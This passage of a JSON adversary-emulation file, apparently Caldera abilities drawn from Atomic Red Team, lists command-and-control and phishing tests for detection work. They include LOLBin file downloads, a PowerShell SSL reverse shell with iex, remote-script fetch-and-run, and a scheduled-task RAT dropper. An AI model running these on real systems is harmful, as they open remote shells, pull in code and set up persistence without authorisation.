            "windows": {
                "cmd": {
                    "cleanup": "del Atomic-license.txt >nul 2>&1",
                    "command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c76968acda4aa1673dadcd67f3ab7664",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "04d33ddae0126966ae6d841267c17329": {
        "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" ; $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue); if(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }",
                    "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "04d33ddae0126966ae6d841267c17329",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "80d0fa686e1f150d3232a60cd42592f5": {
        "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\Atomic-license.txt >nul 2>&1 && del %temp%\\MpCmdRun.log >nul 2>&1",
                    "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\" && MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "80d0fa686e1f150d3232a60cd42592f5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "896243dd934bb06c16d61f4c9018e115": {
        "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"client32\" -force -erroraction silentlycontinue",
                    "command": "Start-Process $env:temp\\T1219Setup.exe -ArgumentList \"/S /v/qn\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "896243dd934bb06c16d61f4c9018e115",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0856c235a1d26113d4f2d92e39c9a9f8": {
        "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0856c235a1d26113d4f2d92e39c9a9f8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7f750da14e9b5694a49bb530201c1f91": {
        "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1573",
            "name": "Encrypted Channel"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7f750da14e9b5694a49bb530201c1f91",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "75cb0aef7266540c6404916e25fc2ddb": {
        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location PathToAtomicsFolder; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "75cb0aef7266540c6404916e25fc2ddb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5d2c642587b75f15b6cdf55552aab67a": {
        "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1090.003",
            "name": "Proxy: Multi-hop Proxy"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c $env:temp\\tor\\Tor\\tor.exe}'; sleep -s 60; stop-process -name \"tor\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5d2c642587b75f15b6cdf55552aab67a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6b69daa92033c152bb2d989c2d6691de": {
        "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1095",
            "name": "Non-Application Layer Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cmd /c",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6b69daa92033c152bb2d989c2d6691de",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b7e982f60cda5578fec60cc8a61568a9": {
        "description": "Use wscript to run a local VisualBasic file to download a remote file",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del Atomic-License.txt >nul 2>&1",
                    "command": "wscript.exe bf591b_T1105-download-file.vbs",
                    "payloads": [
                        "bf591b_T1105-download-file.vbs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "b7e982f60cda5578fec60cc8a61568a9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "472f40b24049b5024cbcfa4579a665ee": {
        "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\redcanary.cab >nul 2>&1",
                    "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe 682a17_redcanary.cab %TEMP% /A",
                    "payloads": [
                        "682a17_redcanary.cab"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "472f40b24049b5024cbcfa4579a665ee",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "31f1b4e545d620d521b7f731699dce2c": {
        "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.\nUpon execution, CMD will be lauchned and ping 8.8.8.8\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1566.001",
            "name": "Phishing: Spearphishing Attachment"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "31f1b4e545d620d521b7f731699dce2c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1afaec09315ab71fdfb167175e8a019a": {
        "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1566.001",
            "name": "Phishing: Spearphishing Attachment"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore",
                    "command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1afaec09315ab71fdfb167175e8a019a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "43c4a1786f10f87dfdc2bffd832c8aa6": {
        "description": "This test simulates an adversary Octupus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1195",
            "name": "Supply Chain Compromise"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "schtasks /delete /tn ExplorerSync /F 2>null && del %temp%\\..\\Microsoft\\ExplorerSync.db 2>null && del %temp%\\ExplorerSync.db 2>null",
                    "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db && schtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "43c4a1786f10f87dfdc2bffd832c8aa6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2f34977d-9558-4c12-abad-349716777c6b": {
        "description": "This test simulates an adversary Octupus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1195",
            "name": "Supply Chain Compromise"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "schtasks /delete /tn ExplorerSync /F 2>null && del %temp%\\..\\Microsoft\\ExplorerSync.db 2>null && del %temp%\\ExplorerSync.db 2>null",
                    "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db && schtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2f34977d-9558-4c12-abad-349716777c6b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "356d1722-7784-40c4-822b-0cf864b0b36d": {
        "description": "This test simulates an adversary Octupus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1195",
            "name": "Supply Chain Compromise"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "schtasks /delete /tn ExplorerSync /F 2>null && del %temp%\\..\\Microsoft\\ExplorerSync.db 2>null && del %temp%\\ExplorerSync.db 2>null",
                    "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db && schtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "356d1722-7784-40c4-822b-0cf864b0b36d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    }
}